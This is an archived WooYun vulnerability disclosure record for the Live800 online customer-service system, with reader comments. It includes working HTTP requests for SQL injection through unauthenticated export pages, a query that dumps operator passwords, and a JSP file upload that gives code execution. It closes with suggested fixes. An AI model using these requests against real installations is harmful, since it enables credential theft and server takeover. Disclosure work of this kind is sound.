{"id": 87023, "wybug_id": "wooyun-2016-0177871", "wybug_title": "Live800在线客服系统SQL查询/GETSHELL漏洞", "wybug_corp": "live800.com", "wybug_author": "applychen", "wybug_date": "2016-02-23 08:49", "wybug_open_date": "2016-05-23 09:40", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传", "设计缺陷", "代码审计"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-02-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-02-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-02-26：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航、无声信息）\t\t\t\t\t\t\t\t\t2016-04-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-04-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-05-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-05-23：\t细节向公众公开  简要描述： 前台SQL查询密码后台GETSHELL漏洞。 详细说明：  在系统中有多处数据导出页面未有权限认证且允许执行SQL查询，并直接把SQL查询结果写到导出文件里面。以下页面的中的subStrSql参数用于执行SQL语句，注意其中的vn参数的数值：\nhttp://domain/sta/export/referrerSta.jsphttp://domain/sta/export/chatTopicSta.jsphttp://domain/sta/export/chatHoursSta.jsphttp://domain/sta/export/chatUrlSta.jsp\n具体数据包如下：\nPOST /live800/sta/export/referrerSta.jsp HTTP/1.1Host: **.**.**.**User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://**.**.**.**/live800/sta/referrerTypeSta.jspConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 136export=csv&vn=dataAnalyseAdapter_referrer&operatorId=&fromTime=2016-02-21&toTime=2016-02-22&companyId=1 or 1=1&subStrSql=(select user())\n\n\n\nPOST /live800/sta/export/chatHoursSta.jsp HTTP/1.1Host: **.**.**.**User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 140export=csv&vn=dataAnalyseAdapter_close_reason&operatorId=&fromTime=2016-02-21&toTime=2016-02-22&companyId=1 or 1=1&subStrSql=(select user())\n\n\n\nPOST /live800/sta/export/chatTopicSta.jsp HTTP/1.1Host: **.**.**.**User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedConnection: keep-aliveContent-Length: 133export=csv&vn=dataAnalyseAdapter_topic&operatorId=&fromTime=2016-02-21&toTime=2016-02-22&companyId=1 or 1=1&subStrSql=(select user())\n\n\n\nPOST /zxkf/sta/export/chatUrlSta.jsp HTTP/1.1Host: **.**.**.**User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedConnection: keep-aliveContent-Length: 132export=csv&vn=dataAnalyseAdapter_url&operatorId=&fromTime=2016-02-21&toTime=2016-02-22&companyId= 1 or 1=1&subStrSql=(select user())\n\n\n注：这里只列出四个将查询的结果输出到页面的文件，sta目录下还有其他页面的subStrSql、companyid、toTime参数存在盲注，请厂商自行排查。这里以http://**.**.**.**/live800/为例进行具体测试，查询用户密码：\nselect group_concat(login_name,0x3a,password) from operator\n\n\n拿到账户密码后登陆后台：\n\n在addOperatorUtil.jsp文件中：\n<%@include file=\"live800Page.jsp\"%>try{\tif(request.getParameter(\"action\")!=null){\t\tString companyId = operatorInfo.getCompanyId();\t\tString filePath =\"tempFileDir/\"+companyId;\t\tString fileName = saveFile(request,filePath);\nlive800Page.jsp用于验证管理员权限，然后调用saveFile(request,filePath)保存文件，代码为：\nString saveFile(HttpServletRequest request,String filePath){\t\tString result =\"\";\t\tDiskFileUpload fu = new DiskFileUpload();\t // 设置允许用户上传文件大小,单位:字节，这里设为2m\t\tfu.setSizeMax(20*1024*1024);\t\tList fileItems = null;\t\ttry{\t \t\tfileItems =  fu.parseRequest(request);\t\t}catch(FileUploadException e){\t\t\treturn result;\t\t}\t\tif(fileItems==null){\t\t\treturn result;\t\t}\t\t\t\tfilePath = UploadAndDownloadServerFile.changeFilePath(request, filePath);\t\tFileUtil.createMenu(filePath);\t\t\t  // 依次处理每个上传的文件\t\tIterator iter = fileItems.iterator();\t\titer = fileItems.iterator();\t\twhile (iter.hasNext()) {\t\t\tFileItem item = (FileItem)iter.next();\t\t\tif (!item.isFormField()) {\t\t        String fileName=filePath+\"/\"+item.getName().substring(item.getName().lastIndexOf(\"\\\\\")+1,item.getName().length());\t\t        File f = new File(fileName);\t\t        if(f.exists()){\t\t        \tf.delete();\t\t        }\t\t        try{\t\t        \titem.write(new File(fileName));\t\t        \tresult=fileName;\t\t        }catch(Exception e){\t\t        \treturn result;\t\t        }\t     \t}\t  \t}\t\treturn result;\t}\n可以看到程序直接从request中获取数据，主要是最终的保存的文件名是怎么处理的：\nString fileName=filePath+\"/\"+item.getName().substring(item.getName().lastIndexOf(\"\\\\\")+1,item.getName().length());\nfilePath是保存文件夹由tempFileDir和companyId组成，item.getName().substring(item.getName().lastIndexOf(\"\\\\\")+1,item.getName().length())获取的就是当前文件名，然后直接使用item.write(new File(fileName))直接写入web目录，整个过程没有过滤后缀导致getshell。在登陆后台的情况下直接访问：\nhttp://**.**.**.**/live800/addOperatorUtil.jsp\n上传一个jsp文件：\nPOST /live800/addOperatorUtil.jsp?action=1 HTTP/1.1Host: **.**.**.**User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://**.**.**.**/live800/addOperatorUtil.jspCookie: JSESSIONID=99F2ACEE3BE6F8310392A8819FDD2FEEConnection: keep-aliveContent-Type: multipart/form-data; boundary=---------------------------232122493724742Content-Length: 235-----------------------------232122493724742Content-Disposition: form-data; name=\"file\"; filename=\"testabc.jsp\"Content-Type: application/ms-excel<%out.println(\"live800 test!\")%>-----------------------------232122493724742--\n最后访问：\nhttp://**.**.**.**/live800/tempFileDir/8934/testabc.jsp\ncompanyId为数字可由数据库中查询得到，也可直接遍历。\n\n列几个受影响的站点：\nhttp://**.**.**.**/live800//tempFileDir/3/testabc.jsphttp://**.**.**.**/live800//tempFileDir/8922/testabc.jsphttp://**.**.**.**/live800/tempFileDir/8905/testabc.jsphttp://**.**.**.**/live800/tempFileDir/8048/testabc.jsphttp://**.**.**.**/zxkf/http://**.**.**.**/chat/http://**.**.**.**/live800/http://**.**.**.**/live800/http://**.**.**.**/live800/http://**.**.**.**/live800/http://**.**.**.**/live800/http://**.**.**.**/live/\n   漏洞证明：  同上   修复方案：  1、建议排查全部有subStrSql参数的页面2、排查sta目录下页面是否全部验证权限3、白名单过滤文件上传后缀   版权声明：转载请注明来源 applychen@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2016-02-23 09:31 厂商回复： 非常感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-02-23 08:52 |    \t\t大师兄 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:8        | 每日必关注乌云)\t\t \n  哥哥面前一条弯弯的河妹妹对面唱着一支甜甜的歌哥哥心中荡起层层的波妹妹何时让我渡过你呀的河    \n     2016-02-23 09:34 |    \t\tCoody  \t\t\t( 核心白帽子 |\t\t\t        Rank:1809 漏洞数:214        | 不接单、不黑产；如遇冒名顶替接单收徒、绝...)\t\t \n  前来膜拜大牛    \n     2016-02-23 10:22 |    \t\tMe_Fortune \t\t\t( 普通白帽子  |\t\t\t        Rank:337 漏洞数:112        | The quiter you are,the more you're able ...)\t\t \n  膜拜大牛    \n     2016-02-29 09:54 |    \t\tpudding2 \t\t\t( 普通白帽子  |\t\t\t        Rank:121 漏洞数:43        | 新人报道，请多关照)\t\t \n  膜拜大牛     \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}